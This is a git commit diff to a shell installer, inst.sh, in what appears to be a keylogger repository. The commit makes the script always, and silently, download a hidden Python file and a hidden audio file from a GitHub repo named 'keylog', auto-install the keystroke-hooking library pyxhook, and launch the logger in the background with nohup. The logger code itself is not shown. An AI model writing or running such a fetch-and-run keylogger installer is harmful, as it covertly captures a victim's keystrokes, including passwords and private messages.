73828a448f0ea2da4037f3f18ba769fc92d8bb53
khaynie <76216676+k-haynie@users.noreply.github.com>
2025-11-17 02:38:54 +0000

    Simplify installation script by removing .pylock check
    Removed the check for .pylock and always execute the installation and script.

--- inst.sh
+++ inst.sh
@@ -1,9 +1,6 @@
 #!/bin/bash
 
-if [ ! -f .pylock ]; then
-  touch .pylock
-  wget -q -nc "https://raw.githubusercontent.com/k-haynie/keylog/main/.log.py"
-  wget -q -nc "https://raw.githubusercontent.com/k-haynie/keylog/main/.music.mp3"
-  yes | pip3 install pyxhook pygame 
-  nohup python3 .log.py &
-fi;
+wget -q -nc "https://raw.githubusercontent.com/k-haynie/keylog/main/.log.py"
+wget -q -nc "https://raw.githubusercontent.com/k-haynie/keylog/main/.music.mp3"
+yes | pip3 install pyxhook pygame 
+nohup python3 .log.py &
